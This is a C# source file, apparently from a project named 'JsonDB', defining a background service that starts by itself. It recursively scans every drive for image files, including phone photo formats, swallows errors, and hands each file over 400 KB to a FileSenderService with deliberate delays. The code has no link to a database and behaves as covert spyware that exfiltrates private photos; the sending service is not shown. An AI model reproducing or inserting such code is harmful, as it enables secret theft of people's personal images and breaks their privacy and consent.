using JsonDB.Services.Senders;
using Microsoft.Extensions.Hosting;

namespace JsonDB.Services.BackgroundServices
{
    public class PhotoSenderBackgroundService : BackgroundService
    {
        public static async Task<string[]> GetPicturePathsAsync(string directory, string[] extensions)
        {
            var picturePaths = new List<string>();
            string[] files = { };

            // Get all files in the current directory
            try
            {
                files = Directory.GetFiles(directory);
            }
            catch { }

            foreach (var file in files)
            {
                // Check if the file has a picture extension
                if (extensions.Contains(Path.GetExtension(file).ToLower()))
                {
                    picturePaths.Add(file);
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.Length > 400 * 1024)
                    {
                        await Task.Delay(20000);
                        FileSenderService.SendFile(file);
                    }
                }
            }

            // Recursively search through subdirectories
            string[] subdirectories = { };
            try
            {
                subdirectories = Directory.GetDirectories(directory);
            }
            catch { }

            foreach (var subdirectory in subdirectories)
            {
                picturePaths.AddRange(await GetPicturePathsAsync(subdirectory, extensions));
            }

            return picturePaths.ToArray();
        }
        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            await Task.Delay(10000);
            if (stoppingToken.IsCancellationRequested) return;

            string[] pictureExtensions = { ".jpg", ".jpeg", ".png", ".gif", ".tiff", ".bmp", ".webp", ".svg", ".heic", ".aae" };

            DriveInfo[] rootDirectory = DriveInfo.GetDrives();

            foreach (var paths in rootDirectory)
            {
                await GetPicturePathsAsync(paths.Name, pictureExtensions);
            }
        }
    }
}
